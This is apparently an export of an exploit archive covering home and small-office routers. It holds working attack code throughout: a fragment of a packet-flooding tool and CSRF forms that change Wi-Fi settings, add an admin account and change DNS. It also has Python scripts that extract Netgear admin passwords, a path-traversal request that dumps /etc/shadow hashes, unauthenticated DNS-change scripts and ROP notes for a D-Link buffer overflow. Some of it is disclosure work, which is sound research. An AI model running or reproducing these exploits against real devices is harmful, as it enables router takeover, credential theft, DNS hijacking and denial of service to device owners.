packet.udp.uh_sum =3D 0;
SEND_PACKET();
static void
send_icmp(u_char gargabe)
struct packet {
struct ip ip;
struct icmp icmp;
} packet;
memset(&packet, 0, sizeof packet);
inject_iphdr(&packet.ip, IPPROTO_ICMP, FIX(sizeof packet));
packet.ip.ip_sum =3D in_cksum((void *)&packet.ip, 20);
packet.icmp.icmp_type =3D ICMP_ECHO;
packet.icmp.icmp_code =3D 0;
packet.icmp.icmp_cksum =3D htons( ~(ICMP_ECHO << 8));
for(int pp=3D0;pp<=3D1000;pp++)
{SEND_PACKET();
pp++;
static void
usage(const char *argv0)
printf(""%s \n"", banner);
printf("" -U UDP attack \e[1;37m(\e[0m\e[0;31mno options\e[0m\e[1;37m)\e[0m\=
n"");
printf("" -I ICMP attack \e[1;37m(\e[0m\e[0;31mno options\e[0m\e[1;37m)\e[0m=
\n"");
printf("" -N Bogus attack \e[1;37m(\e[0m\e[0;31mno options\e[0m\e[1;37m)\e[0=
m\n"");
printf("" -T TCP attack \e[1;37m[\e[0m0:ACK, 1:FIN, 2:RST, 3:SYN, 4:URG\e[1;=
37m]\e[0m\n"");
printf("" -h destination host/ip \e[1;37m(\e[0m\e[0;31mno default\e[0m\e[1;3=
7m)\e[0m\n"");
printf("" -d destination class \e[1;37m(\e[0m\e[0;31mrandom\e[0m\e[1;37m)\e[=
0m\n"");
printf("" -s source class/ip \e[1;37m(\e[m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\=
n"");
printf("" -p destination port range [start,end] \e[1;37m(\e[0m\e[0;31mrandom=
\e[0m\e[1;37m)\e[0m\n"");
printf("" -q source port range [start,end] \e[1;37m(\e[0m\e[0;31mrandom\e[0m=
\e[1;37m)\e[0m\n"");
printf("" -l pps limiter \e[1;37m(\e[0m\e[0;31mno limit\e[0m\e[1;37m)\e[0m\n=
printf("" -t timeout \e[1;37m(\e[0m\e[0;31mno default\e[0m\e[1;37m)\e[0m\n"")=
printf(""\e[1musage\e[0m: %s [-T0 -T1 -T2 -T3 -T4 -U -I -h -p -t]\n"", argv0)=
exit(-1);"
2017-02-21,WebApps,Hardware,Indrajith.A.N,DIGISOL DG-HR1400 Wireless Router,Cross-Site Request Forgery,,"<html>
Digisol Router CSRF Exploit - Indrajith A.N
<body>
<script>history.pushState('', '', '/')</script>
<form action=""http://192.168.2.1/form2WlanBasicSetup.cgi"" method=""POST"">
<input type=""hidden"" name=""mode"" value=""0"" />
<input type=""hidden"" name=""apssid"" value=""hacked"" />
<input type=""hidden"" name=""startScanUplinkAp"" value=""0"" />
<input type=""hidden"" name=""domain"" value=""1"" />
<input type=""hidden"" name=""hiddenSSID"" value=""on"" />
<input type=""hidden"" name=""ssid"" value=""hacked"" />
<input type=""hidden"" name=""band"" value=""10"" />
<input type=""hidden"" name=""chan"" value=""6"" />
<input type=""hidden"" name=""chanwid"" value=""1"" />
<input type=""hidden"" name=""txRate"" value=""0"" />
<input type=""hidden"" name=""method&#95;cur"" value=""6"" />
<input type=""hidden"" name=""method"" value=""6"" />
<input type=""hidden"" name=""authType"" value=""2"" />
<input type=""hidden"" name=""length"" value=""1"" />
<input type=""hidden"" name=""format"" value=""2"" />
<input type=""hidden"" name=""defaultTxKeyId"" value=""1"" />
<input type=""hidden"" name=""key1"" value=""0000000000"" />
<input type=""hidden"" name=""pskFormat"" value=""0"" />
<input type=""hidden"" name=""pskValue"" value=""csrf1234"" />
<input type=""hidden"" name=""checkWPS2"" value=""1"" />
<input type=""hidden"" name=""save"" value=""Apply"" />
<input type=""hidden"" name=""basicrates"" value=""15"" />
<input type=""hidden"" name=""operrates"" value=""4095"" />
<input type=""hidden"" name=""submit&#46;htm&#63;wlan&#95;basic&#46;htm"" value=""Send"" />
<input type=""submit"" value=""Submit request"" />
</form>
</body>
</html>"
2015-09-03,WebApps,Hardware,Mandeep Jadon,Tenda N3 Wireless N150 Router,Authentication Bypass,"# Exploit Title: Complete Authentication Bypass In Tenda N3 Wireless N150 Routers
# Date: 03-09-2015
# Software Link: http://tendacn.com/en/product/N150.html
# Exploit Author: Mandeep Jadon
# Contact: http://twitter.com/1337tr0lls
# Website: http://twitter.com/1337tr0lls
# CVE: CVE-2015-5995
# Category: Device
Description:
https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-5995
https://www.kb.cert.org/vuls/id/630872","The router (AP) is using very poor authentication mechanism . It uses a
static cookie to verify the incoming authentication. After careful
inspection it was found that the cookie used were same for any number of
authentication by the Admin .
Thus the cookie can be easily forged and the admin account could be
compromised without supplying the credentials .
Proof Of Concept:
Inject the following cookie in the browser with the given values :
admin:language : en
Reload the page . You are logged into the admin account .
Video POC : https://www.youtube.com/watch?v=dvF-7KK0g6E
Mitigation :
Use: a secure authentication mechanism consisting of random , complex
cookies .
References :"
2017-01-30,WebApps,Hardware,Trustwave's SpiderLabs,Netgear Routers,Password Disclosure,"# AC1450 V1.0.0.34_10.0.16 (Latest)
# AC1450 V1.0.0.22_1.0.10
# AC1450 V1.0.0.14_1.0.6
# D6400 V1.0.0.44_1.0.44 (V1.0.0.52_1.0.52 and above not affected)
# D6400 V1.0.0.34_1.3.34
# D6400 V1.0.0.38_1.1.38
# D6400 V1.0.0.22_1.0.22
# DC112A V1.0.0.30_1.0.60 (Latest)
# DGN2200v4 V1.0.0.24_5.0.8 (V1.0.0.66_1.0.66 is latest and is not affected)
# JNDR3000 V1.0.0.18_1.0.16 (Latest)
# R6200 V1.0.1.48_1.0.37 (V1.0.1.52_1.0.41 and above are not affected)
# R6200v2 V1.0.1.20_1.0.18 (V1.0.3.10_10.1.10 is latest and is not affected)
# R6250 V1.0.1.84_1.0.78 (V1.0.4.2_10.1.10 is latest and is not affected)
# R6300V1.0.2.78_1.0.58 (Latest)
# R6300v2 V1.0.4.2_10.0.74 (V1.0.4.6_10.0.76 is latest and is patched)
# R6300v2 V1.0.3.30_10.0.73
# R6700 V1.0.1.14_10.0.29 (Latest beta)
# R6700 V1.0.0.26_10.0.26 (Latest stable)
# R6700 V1.0.0.24_10.0.18
# R6900 V1.0.0.4_1.0.10 (Latest)
# R7000 V1.0.6.28_1.1.83 (V1.0.7.2_1.1.93 is latest and is patched)
# R8300 V1.0.2.48_1.0.52
# R8500 V1.0.2.30_1.0.43 (V1.0.2.64_1.0.62 and above is patched)
# R8500 V1.0.2.26_1.0.41
# R8500 V1.0.0.56_1.0.28
# R8500 V1.0.0.20_1.0.11
# VEGN2610 V1.0.0.35_1.0.35 (Latest)
# VEGN2610 V1.0.0.29_1.0.29
# VEGN2610 V1.0.0.27_1.0.27
# WNDR3400v2 V1.0.0.16_1.0.34 (V1.0.0.52_1.0.81 is latest and is not affected)
# WNDR3400v3 V1.0.0.22_1.0.29 (V1.0.1.2_1.0.51 is latest and is not affected)
# WNDR3700v3 V1.0.0.38_1.0.31 (Latest)
# WNDR4000 V1.0.2.4_9.1.86 (Latest)
# WNDR4500 V1.0.1.40_1.0.68 (Latest)
# WNDR4500v2 V1.0.0.60_1.0.38 (Latest)
# WNDR4500v2 V1.0.0.42_1.0.25
# WGR614v10 V1.0.2.60_60.0.85NA (Latest)
# WGR614v10 V1.0.2.58_60.0.84NA
# WGR614v10 V1.0.2.54_60.0.82NA
# WN3100RP V1.0.0.14_1.0.19 (Latest)
# WN3100RP V1.0.0.6_1.0.12
# Lenovo R3220 V1.0.0.16_1.0.16 (Latest)
# Lenovo R3220 V1.0.0.13_1.0.13
http://router/passwordrecovered.cgi?id=TOKEN (and password recovery is not
## netgore.py
#disable nasty insecure ssl warning
#1st stage - get token
#2nd stage - pass the token - get the password
#profit
#html encoding pops out of nowhere, lets replace that
# AC1450 V1.0.0.34_10.0.16 (Latest)
# AC1450 V1.0.0.22_1.0.10
# AC1450 V1.0.0.14_1.0.6
# D6300 V1.0.0.96_1.1.96 (Latest)
# D6300B V1.0.0.36_1.0.36
# D6300B V1.0.0.32_1.0.32
# D6400 V1.0.0.44_1.0.44 (V1.0.0.52_1.0.52 is latest and is patched)
# D6400 V1.0.0.22_1.0.22
# DC112A V1.0.0.30_1.0.60 (Latest)
# DGN2200v4 V1.0.0.76_1.0.76 (Latest)
# DGN2200v4 V1.0.0.66_1.0.66
# DGN2200Bv4 V1.0.0.68_1.0.68 (Latest)
# JNDR3000 V1.0.0.18_1.0.16 (Latest)
# R6200 V1.0.1.56_1.0.43 (Latest)
# R6200 V1.0.1.52_1.0.41
# R6200 V1.0.1.48_1.0.37
# R6200v2 V1.0.3.10_10.1.10 (Latest)
# R6200v2 V1.0.1.20_1.0.18
# R6250 V1.0.4.6_10.1.12 (Latest beta)
# R6250 V1.0.4.2_10.1.10 (Latest stable)
# R6250 V1.0.1.84_1.0.78
# R6300V1.0.2.78_1.0.58 (Latest)
# R6300v2 V1.0.4.2_10.0.74 (V1.0.4.6_10.0.76 is latest and is patched)
# R6300v2 V1.0.3.6_1.0.63CH (Charter Comm.)
# R6400 V1.0.0.26_1.0.14 (V1.0.1.12_1.0.11 is latest and is patched)
# R6700 V1.0.0.26_10.0.26 (Latest)
# R6700 V1.0.0.24_10.0.18
# R6900 V1.0.0.4_1.0.10 (Latest)
# R7000 V1.0.6.28_1.1.83 (V1.0.7.2_1.1.93 is latest and is patched)
# R7000 V1.0.4.30_1.1.67
# R7900 V1.0.1.8_10.0.14 (Latest beta)
# R7900 V1.0.1.4_10.0.12 (Latest stable)
# R7900 V1.0.0.10_10.0.7
# R7900 V1.0.0.8_10.0.5
# R7900 V1.0.0.6_10.0.4
# R8000 V1.0.3.26_1.1.18 (Latest beta)
# R8000 V1.0.3.4_1.1.2 (Latest stable)
# R8300 V1.0.2.48_1.0.52
# R8500 V1.0.0.56_1.0.28 (V1.0.2.64_1.0.62 and above is patched)
# R8500 V1.0.2.30_1.0.43
# VEGN2610 V1.0.0.35_1.0.35 (Latest)
# VEGN2610 V1.0.0.27_1.0.27
# VEGN2610-1FXAUS V1.0.0.36_1.0.36 (Latest)
# VEVG2660 V1.0.0.23_1.0.23
# WNDR3400v2 V1.0.0.52_1.0.81 (Latest)
# WNDR3400v3 V1.0.1.4_1.0.52 (Latest)
# WNDR3400v3 V1.0.1.2_1.0.51
# WNDR3400v3 V1.0.0.22_1.0.29
# WNDR3700v3 V1.0.0.38_1.0.31 (Latest)
# WNDR4000 V1.0.2.4_9.1.86 (Latest)
# WNDR4500 V1.0.1.40_1.0.68 (Latest)
# WNDR4500 V1.0.1.6_1.0.24
# WNDR4500v2 V1.0.0.60_1.0.38 (Latest)
# WNDR4500v2 V1.0.0.50_1.0.30
# WNR1000v3 V1.0.2.68_60.0.93NA (Latest)
# WNR1000v3 V1.0.2.62_60.0.87 (Latest)
# WNR3500Lv2 V1.2.0.34_40.0.75 (Latest)
# WNR3500Lv2 V1.2.0.32_40.0.74
# WGR614v10 V1.0.2.60_60.0.85NA (Latest)
# WGR614v10 V1.0.2.58_60.0.84NA
# WGR614v10 V1.0.2.54_60.0.82NA
# Lenovo R3220 V1.0.0.16_1.0.16 (Latest)
# Lenovo R3220 V1.0.0.13_1.0.13
http://router/passwordrecovered.cgi?id=TOKEN (and password recovery is not
## netgore2.py
#disable nasty insecure ssl warning
#1st stage
#2nd stage
#profit
#html encoding pops out of nowhere, lets replace that
https://www.trustwave.com/spiderlabs","Trustwave SpiderLabs Security Advisory TWSL2017-003:
Multiple Vulnerabilities in NETGEAR Routers
Published: 01/30/2017
Version: 1.0
Vendor: NETGEAR (http://www.netgear.com/)
Product: Multiple products
Finding 1: Remote and Local Password Disclosure
Credit: Simon Kenin of Trustwave SpiderLabs
CVE: CVE-2017-5521
Version affected:
Product description:
Multiple Netgear Routers
Many Netgear routers are prone to password disclosure via simple crafted
requests to the web management server. The bug is exploitable remotely if the
remote management option is set and can also be exploited given access to the
router over LAN or WLAN.
When trying to access the web panel a user is asked to authenticate, if the
authentication is cancelled and password recovery is not enabled, the user is
redirected to a page which exposes a password recovery token. If a user
supplies the correct token to the page
enabled), they will receive the admin password for the router.
If password recovery is set the exploit will fail, as it will ask the user for the recovery
questions which were previously set when enabling the feature, this is
persistent, even after disabling the recovery option the exploit will fail,
because the router will ask for the security questions.
This can easily be reproduced using the attached poc, or by sending these two
simple requests via the browser:
1. http://router/.../ will redirect you to http://router/..../unauth.cgi?id=TOKEN to acquire the token
2. http://router/passwordrecovered.cgi?id=TOKEN will give you credentials (some models require you to send a post request instead of get)
import sys
import requests
def scrape(text, start_trig, end_trig):
if text.find(start_trig) != -1:
return text.split(start_trig, 1)[-1].split(end_trig, 1)[0]
else:
return ""i_dont_speak_english""
requests.packages.urllib3.disable_warnings()
ip = sys.argv[1]
port = sys.argv[2]
url = 'http://' + ip + ':' + port + '/'
try:
r = requests.get(url)
except:
url = 'https://' + ip + ':' + port + '/'
r = requests.get(url, verify=False)
model = r.headers.get('WWW-Authenticate')
if model is not None:
print ""Attcking: "" + model[13:-1]
else:
print ""not a netgear router""
sys.exit(0)
token = scrape(r.text, 'unauth.cgi?id=', '\""')
if token == 'i_dont_speak_english':
print ""not vulnerable""
sys.exit(0)
print ""token found: "" + token
url = url + 'passwordrecovered.cgi?id=' + token
r = requests.post(url, verify=False)
if r.text.find('left\"">') != -1:
username = (repr(scrape(r.text, 'Router Admin Username</td>', '</td>')))
username = scrape(username, '>', '\'')
password = (repr(scrape(r.text, 'Router Admin Password</td>', '</td>')))
password = scrape(password, '>', '\'')
if username == ""i_dont_speak_english"":
username = (scrape(r.text[r.text.find('left\"">'):-1], 'left\"">', '</td>'))
password = (scrape(r.text[r.text.rfind('left\"">'):-1], 'left\"">', '</td>'))
else:
print ""not vulnerable becuse password recovery IS set""
sys.exit(0)
password = password.replace(""&#35;"",""#"")
password = password.replace(""&"",""&"")
print ""user: "" + username
print ""pass: "" + password
Just run the PoC against a router to get the credentials if it is vulnerable.
Finding 2: Remote and Local Password Disclosure
Credit: Simon Kenin of Trustwave SpiderLabs
CVE: CVE-2017-5521
Version affected:
Many Netgear routers are prone to password disclosure via simple crafted
request to the web management server. The bug is exploitable remotely if the
remote management option is set and can also be exploited given access to the
router over LAN or WLAN.
Netgear routers have an option to restore forgotten password via 2 security
questions. If the recovery option is disabled (which is the default), it is
still possible to recover the password by sending a correct token to the
recovery page.
If a user supplies the correct token to the page
enabled), they will receive the admin password for the router. If password
recovery is set the exploit will fail, as it will ask the user for the recovery
questions which were previously set when enabling the feature, this is
persistent, even after disabling the recovery option, the exploit will fail,
because the router will ask for the security questions.
This mechanism does not work correctly on the very first request to
""passwordrecovered.cgi"" and the token is not properly checked, this means that
any TOKEN value will result in disclosure of the password.
The issue occurs after every reboot of the router.
This can easily be reproduced using the attached poc, or by sending a simple
request via the browser:
1. http://router/passwordrecovered.cgi?id=Trustwave_SpiderLabs will give you credentials (some models require you to send a post request instead of get)
import sys
import requests
def scrape(text, start_trig, end_trig):
if text.find(start_trig) != -1:
return text.split(start_trig, 1)[-1].split(end_trig, 1)[0]
else:
return ""i_dont_speak_english""
requests.packages.urllib3.disable_warnings()
ip = sys.argv[1]
port = sys.argv[2]
url = 'http://' + ip + ':' + port + '/'
try:
r = requests.get(url)
except:
url = 'https://' + ip + ':' + port + '/'
r = requests.get(url, verify=False)
model = r.headers.get('WWW-Authenticate')
if model is not None:
print ""Attcking: "" + model[13:-1]
else:
print ""not a netgear router""
sys.exit(0)
url = url + 'passwordrecovered.cgi?id=get_rekt'
try:
r = requests.post(url, verify=False)
except:
print ""not vulnerable router""
sys.exit(0)
if r.text.find('left\"">') != -1:
username = (repr(scrape(r.text, 'Router Admin Username</td>', '</td>')))
username = scrape(username, '>', '\'')
password = (repr(scrape(r.text, 'Router Admin Password</td>', '</td>')))
password = scrape(password, '>', '\'')
if username == ""i_dont_speak_english"":
username = (scrape(r.text[r.text.find('left\"">'):-1], 'left\"">', '</td>'))
password = (scrape(r.text[r.text.rfind('left\"">'):-1], 'left\"">', '</td>'))
else:
print ""not vulnerable router, or some one else already accessed passwordrecovered.cgi, reboot router and test again""
sys.exit(0)
password = password.replace(""&#35;"",""#"")
password = password.replace(""&"",""&"")
print ""user: "" + username
print ""pass: "" + password
Just run the PoC against a router to get the credentials if it is vulnerable.
Remediation Steps:
Please see NETGEAR's KBA for list of firmware patches for various models. As a
workaround, the bug only works when password recovery is NOT set. If you do set
password recovery this is not exploitable.
Revision History:
04/06/2016 - Vulnerability disclosed to vendor
04/19/2016 - Request for update and received confirmation of receipt of the advisories
05/18/2016 - Request for update; no response
07/14/2016 - Request for update
07/15/2016 - Notice of patch for some models and workaround KBA received along with commitment towards 100% coverage
10/17/2016 - Request for update
12/15/2016 - Notice of intent to publish advisories
01/04/2017 - Vendor responds with patch timeline and announcement of participation in Bugcrowd
01/30/2017 - Advisory published
References
1. http://c1ph04text.blogspot.com/2014/01/mitrm-attacks-your-middle-or-mine.html
2. https://www.exploit-db.com/exploits/32883/
3. http://kb.netgear.com/30632/Web-GUI-Password-Recovery-and-Exposure-Security-Vulnerability
About Trustwave:
Trustwave is the leading provider of on-demand and subscription-based
information security and payment card industry compliance management
solutions to businesses and government entities throughout the world. For
organizations faced with today's challenging data security and compliance
environment, Trustwave provides a unique approach with comprehensive
solutions that include its flagship TrustKeeper compliance management
software and other proprietary security solutions. Trustwave has helped
thousands of organizations--ranging from Fortune 500 businesses and large
financial institutions to small and medium-sized retailers--manage
compliance and secure their network infrastructure, data communications and
critical information assets. Trustwave is headquartered in Chicago with
offices throughout North America, South America, Europe, Africa, China and
Australia. For more information, visit https://www.trustwave.com
About Trustwave SpiderLabs:
SpiderLabs(R) is the advanced security team at Trustwave focused on
application security, incident response, penetration testing, physical
security and security research. The team has performed over a thousand
incident investigations, thousands of penetration tests and hundreds of
application security tests globally. In addition, the SpiderLabs Research
team provides intelligence through bleeding-edge research and proof of
concept tool development to enhance Trustwave's products and services.
Disclaimer:
The information provided in this advisory is provided ""as is"" without
warranty of any kind. Trustwave disclaims all warranties, either express or
implied, including the warranties of merchantability and fitness for a
particular purpose. In no event shall Trustwave or its suppliers be liable
for any damages whatsoever including direct, indirect, incidental,
consequential, loss of business profits or special damages, even if
Trustwave or its suppliers have been advised of the possibility of such
damages. Some states do not allow the exclusion or limitation of liability
for consequential or incidental damages so the foregoing limitation may not
apply."
2017-01-26,WebApps,Hardware,Saeid Atabaki,TM RG4332 Wireless Router,Arbitrary File Disclosure,"# Exploit Title: TM RG4332 Wireless Router Traversal Arbitrary File Read
# Date: 27/01/2017
# Exploit Author: Saeid Atabaki
# Version: RG4332_V2.7.0
# Tested on: RG4332 with mini_http 1.19
#root:x:0:0:root:/root:/bin/bash
#tw:x:504:504::/home/tw:/bin/bash
#tw:x:504:504::/home/tw:/bin/msh
#root:$1$BOYmzSKq$ePjEPSpkQGeBcZjlEeLqI.:13796:0:99999:7:::
#tw:$1$zxEm2v6Q$qEbPfojsrrE/YkzqRm7qV/:13796:0:99999:7:::
#tw:$1$zxEm2v6Q$qEbPfojsrrE/YkzqRm7qV/:13796:0:99999:7:::","= 1 =============================================================
GET /cgi-bin/webproc?getpage=html/../../../etc/passwd&var:menu=status&var:page=system_msg HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cookie: sessionid=17746062; auth=ok; expires=Sun, 15-May-2012 01:45:46 GMT; language=en_us; Lan_IPAddress=192.168.0.1; sys_UserName=admin; expires=Mon, 31-Jan-2050 16:00:00 GMT
Connection: close
HTTP/1.0 200 OK
Content-type: text/html
Cache-Control: no-cache
set-cookie: sessionid=17746062;
set-cookie: auth=ok;
set-cookie: expires=Sun, 15-May-2012 01:45:46 GMT;
root:x:0:0:root:/root:/bin/sh
= 2 =============================================================
GET /cgi-bin/webproc?getpage=html/../../../etc/shadow&var:menu=status&var:page=system_msg HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cookie: sessionid=17746062; auth=ok; expires=Sun, 15-May-2012 01:45:46 GMT; language=en_us; Lan_IPAddress=192.168.0.1; sys_UserName=admin; expires=Mon, 31-Jan-2050 16:00:00 GMT
Connection: close
HTTP/1.0 200 OK
Content-type: text/html
Cache-Control: no-cache
set-cookie: sessionid=17746062;
set-cookie: auth=ok;
set-cookie: expires=Sun, 15-May-2012 01:45:46 GMT;
root:$1$BOYmzSKq$ePjEPSpkQGeBcZjlEeLqI.:13796:0:99999:7:::"
2017-01-19,WebApps,Hardware,Todor Donev,Pirelli DRG A115 v3 ADSL Router,DNS Change,"#!/bin/bash
#  Pirelli DRG A115 v3 ADSL Router
#  Unauthenticated  Remote DNS Change Exploit
#  Copyright 2017 (c) Todor Donev <todor.donev at gmail.com>
#  https://www.ethical-hacker.org/
#  https://www.facebook.com/ethicalhackerorg
#  Description:
#  The vulnerability exist in the web interface, which is
#  accessible without authentication.
#  Once modified, systems use foreign DNS servers,  which are
#  usually set up by cybercriminals. Users with vulnerable
#  systems or devices who try to access certain sites are
#  instead redirected to possibly malicious sites.
#  Modifying systems' DNS settings allows cybercriminals to
#  perform malicious activities like:
#    o  Steering unknowing users to bad sites:
#       These sites can be phishing pages that
#       spoof well-known sites in order to
#       trick users into handing out sensitive
#       information.
#    o  Replacing ads on legitimate sites:
#       Visiting certain sites can serve users
#       with infected systems a different set
#       of ads from those whose systems are
#       not infected.
#    o  Controlling and redirecting network traffic:
#       Users of infected systems may not be granted
#       access to download important OS and software
#       updates from vendors like Microsoft and from
#       their respective security vendors.
#    o  Pushing additional malware:
#       Infected systems are more prone to other
#       malware infections (e.g., FAKEAV infection).
#  Disclaimer:
#  This or previous programs is for Educational
#  purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the
#  fact that Todor Donev is not liable for any
#  damages caused by direct or indirect use of the
#  information or functionality provided by these
#  programs. The author or any Internet provider
#  bears NO responsibility for content or misuse
#  of these programs or any derivatives thereof.
#  By using these programs you accept the fact
#  that any damage (dataloss, system crash,
#  system compromise, etc.) caused by the use
#  of these programs is not Todor Donev's
#  responsibility.
#  Use them at your own risk!
#  The malicious code doesn't sleeping, he stalking..","if [[ $# -gt 3 || $# -lt 2 ]]; then
echo ""                    Pirelli DRG A115 v3 ""
echo ""           Unauthenticated Remote DNS Change Exploit""
echo ""  ===================================================================""
echo ""  Usage: $0 <Target> <Primary DNS> <Secondary DNS>""
echo ""  Example: $0 133.7.133.7 8.8.8.8""
echo ""  Example: $0 133.7.133.7 8.8.8.8 8.8.4.4""
echo """"
echo ""      Copyright 2017 (c) Todor Donev <todor.donev at gmail.com>""
echo ""  https://www.ethical-hacker.org/ https://www.fb.com/ethicalhackerorg""
exit;
fi
GET=`which GET 2>/dev/null`
if [ $? -ne 0 ]; then
echo ""  Error : libwww-perl not found =/""
exit;
fi
GET -e ""http://$1/dnscfg.cgi?dnsPrimary=$2&dnsSecondary=$3&dnsDynamic=0&dnsRefresh=1"" 0&> /dev/null <&1"
2017-01-16,WebApps,Hardware,Todor Donev,Pirelli DRG A115 ADSL Router,DNS Change,"#!/bin/bash
#  Pirelli DRG A115 ADSL Router
#  Unauthenticated  Remote DNS Change Exploit
#  Copyright 2017 (c) Todor Donev <todor.donev at gmail.com>
#  https://www.ethical-hacker.org/
#  https://www.facebook.com/ethicalhackerorg
#  Description:
#  The vulnerability exist in the web interface, which is
#  accessible without authentication.
#  Once modified, systems use foreign DNS servers,  which are
#  usually set up by cybercriminals. Users with vulnerable
#  systems or devices who try to access certain sites are
#  instead redirected to possibly malicious sites.
#  Modifying systems' DNS settings allows cybercriminals to
#  perform malicious activities like:
#    o  Steering unknowing users to bad sites:
#       These sites can be phishing pages that
#       spoof well-known sites in order to
#       trick users into handing out sensitive
#       information.
#    o  Replacing ads on legitimate sites:
#       Visiting certain sites can serve users
#       with infected systems a different set
#       of ads from those whose systems are
#       not infected.
#    o  Controlling and redirecting network traffic:
#       Users of infected systems may not be granted
#       access to download important OS and software
#       updates from vendors like Microsoft and from
#       their respective security vendors.
#    o  Pushing additional malware:
#       Infected systems are more prone to other
#       malware infections (e.g., FAKEAV infection).
#  Disclaimer:
#  This or previous programs is for Educational
#  purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the
#  fact that Todor Donev is not liable for any
#  damages caused by direct or indirect use of the
#  information or functionality provided by these
#  programs. The author or any Internet provider
#  bears NO responsibility for content or misuse
#  of these programs or any derivatives thereof.
#  By using these programs you accept the fact
#  that any damage (dataloss, system crash,
#  system compromise, etc.) caused by the use
#  of these programs is not Todor Donev's
#  responsibility.
#  Use them at your own risk!
#  The malicious code doesn't sleeping, he stalking..","if [[ $# -gt 3 || $# -lt 2 ]]; then
echo ""                    Pirelli DRG A115 ""
echo ""           Unauthenticated Remote DNS Change Exploit""
echo ""  ===================================================================""
echo ""  Usage: $0 <Target> <Primary DNS> <Secondary DNS>""
echo ""  Example: $0 133.7.133.7 8.8.8.8""
echo ""  Example: $0 133.7.133.7 8.8.8.8 8.8.4.4""
echo """"
echo ""      Copyright 2017 (c) Todor Donev <todor.donev at gmail.com>""
echo ""  https://www.ethical-hacker.org/ https://www.fb.com/ethicalhackerorg""
exit;
fi
GET=`which GET 2>/dev/null`
if [ $? -ne 0 ]; then
echo ""  Error : libwww-perl not found =/""
exit;
fi
GET -e ""http://$1/dnscfg.cgi?dnsPrimary=$2&dnsSecondary=$3&dnsDynamic=0&dnsRefresh=1"" 0&> /dev/null <&1"
2016-12-11,WebApps,Hardware,Persian Hack Team,ARG-W4 ADSL Router,Multiple Vulnerabilities,"# Exploit Title: ARG-W4 ADSL Router - Multiple Vulnerabilities
# Date: 2016-12-11
# Exploit Author: Persian Hack Team
# Discovered by : Mojtaba MobhaM
# Tested on: Windows AND Linux
# Exploit Demo : http://persian-team.ir/showthread.php?tid=196
#!/usr/bin/python","1 - Denial of Service
import urllib2
import urllib
site=raw_input(""Enter Url : "")
site=site+""/form2Upnp.cgi""
username='admin'
password='admin'
p = urllib2.HTTPPasswordMgrWithDefaultRealm()
p.add_password(None, site, username, password)
handler = urllib2.HTTPBasicAuthHandler(p)
opener = urllib2.build_opener(handler)
urllib2.install_opener(opener)
post = {'daemon':' ','ext_if':'pppoe+1','submit.htm?upnp.htm':'Send'}
data = urllib.urlencode(post)
try:
html = urllib2.urlopen(site,data)
print (""Done ! c_C"")
except:
print (""Done ! c_C"")
2-1 Cross-Site Request Forgery (Add Admin)
<html>
<body>
<form action=""http://192.168.1.1/form2userconfig.cgi"" method=""POST"">
USER:<input type=""text"" name=""username"" value=""mobham"" />
<input type=""hidden"" name=""privilege"" value=""2"" />
PWD:<input type=""text"" name=""newpass"" value=""mobham"" />
RPWD:<input type=""texr"" name=""confpass"" value=""mobham"" />
<input type=""hidden"" name=""adduser"" value=""Add"" />
<input type=""hidden"" name=""hiddenpass"" value="""" />
<input type=""hidden"" name=""submit&#46;htm&#63;userconfig&#46;htm"" value=""Send"" />
<input type=""submit"" value=""Submit request"" />
</form>
</body>
</html>
2-2 Cross-Site Request Forgery (Change DNS)
<html>
<body>
<form action=""http://192.168.1.1/form2Dns.cgi"" method=""POST"">
<input type=""hidden"" name=""dnsMode"" value=""1"" />
DNS<input type=""text"" name=""dns1"" value=""2&#46;2&#46;2&#46;2"" />
DNS 2<input type=""text"" name=""dns2"" value=""1&#46;1&#46;1&#46;1"" />
DNS 3<input type=""text"" name=""dns3"" value="""" />
<input type=""hidden"" name=""submit&#46;htm&#63;dns&#46;htm"" value=""Send"" />
<input type=""hidden"" name=""save"" value=""Apply&#32;Changes"" />
<input type=""submit"" value=""Submit request"" />
</form>
</body>
</html>"
2016-11-21,Remote,Multiple,Metasploit,D-Link DIR-Series Routers,HNAP Login Stack Buffer Overflow (Metasploit),"# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
# Payload working status:
# MIPS:
#   - all valid payloads working (the ones that we are able to send without null bytes)
# ARM:
#  - inline rev/bind shell works (bind... meh sometimes)
#  - stager rev/bind shell FAIL
#  - mettle rev/bind fails with sigsegv standalone, but works under strace or gdb...
#All these gadgets are from /lib/libuClibc-0.9.32.1.so, which is the library used for all versions of firmware for all ARM routers
#first_gadget (pops system() address into r3, and second_gadget into PC):
#.text:00018298                 LDMFD           SP!, {R3,PC}
#second_gadget (puts the stack pointer into r0 and calls system() at r3):
#.text:00040CB8                 MOV             R0, SP
#.text:00040CBC                 BLX             R3
#system() (Executes argument in r0 (our stack pointer)
#.text:0005A270 system
#The final payload will be:
#'a' * 1024 + 0xffffffff + 'b' * 16 + 'AAAA' + first_gadget + system() + second_gadget + command
#All these gadgets are from /lib/libuClibc-0.9.30.3.so, which is the library used for all versions of firmware for all MIPS routers
#<sleep> is at 56DF0
#first gadget - execute sleep and call second_gadget
#.text:0004EA1C                 move    $t9, $s0 <- sleep()
#.text:0004EA20                 lw      $ra, 0x20+var_4($sp) <- second_gadget
#.text:0004EA24                 li      $a0, 2 <- arg for sleep()
#.text:0004EA28                 lw      $s0, 0x20+var_8($sp)
#.text:0004EA2C                 li      $a1, 1
#.text:0004EA30                 move    $a2, $zero
#.text:0004EA34                 jr      $t9
#.text:0004EA38                 addiu   $sp, 0x20
#second gadget - put stack pointer in a1:
#.text:0002468C                 addiu   $s1, $sp, 0x58
#.text:00024690                 li      $s0, 0x44
#.text:00024694                 move    $a2, $s0
#.text:00024698                 move    $a1, $s1
#.text:0002469C                 move    $t9, $s4
#.text:000246A0                 jalr    $t9
#.text:000246A4                 move    $a0, $s2
